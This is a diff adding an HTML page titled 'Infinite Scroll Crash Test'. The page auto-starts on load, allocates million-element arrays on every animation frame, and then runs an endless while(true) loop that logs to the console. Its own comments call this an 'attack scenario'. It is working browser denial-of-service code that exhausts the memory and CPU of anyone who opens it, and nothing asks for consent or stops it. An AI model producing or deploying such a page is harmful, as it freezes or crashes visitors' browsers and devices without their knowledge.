@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Infinite Scroll Crash Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #111;
+            color: #0f0;
+            text-align: center;
+        }
+        .content {
+            font-size: 24px;
+            padding: 20px;
+            border-bottom: 2px solid #0f0;
+        }
+    </style>
+    <script>
+        // Function to simulate infinite scrolling effect
+        function infiniteScroll() {
+            let container = document.getElementById('scrollContainer');
+            let count = 0;
+
+            function addContent() {
+                count++;
+                let div = document.createElement('div');
+                div.className = 'content';
+                div.innerHTML = `Scrolling... Item ${count}`;
+                container.appendChild(div);
+
+                // Auto-scroll to the bottom to simulate infinite scrolling
+                window.scrollTo(0, document.body.scrollHeight);
+
+                // Exponentially increase memory usage
+                let junkData = new Array(1000000).fill("excessive_memory_usage");
+                memoryLeak.push(junkData);
+
+                if (count < 1000000) {
+                    requestAnimationFrame(addContent);
+                }
+            }
+
+            addContent();
+        }
+
+        // Function to create excessive CPU usage with infinite loops
+        function cpuOverload() {
+            while (true) {
+                console.log("CPU Overload: ", Math.random());
+            }
+        }
+
+        // Function to start the attack scenario after a delay
+        function startTest() {
+            setTimeout(() => {
+                infiniteScroll();
+                cpuOverload();
+            }, 2000);
+        }
+
+        let memoryLeak = [];
+
+        // Auto-start after a delay
+        window.onload = () => {
+            setTimeout(startTest, 3000);
+        };
+    </script>
+</head>
+<body>
+    <h1>INFINITE SCROLL TEST</h1>
+    <div id="scrollContainer"></div>
+</body>
+</html>
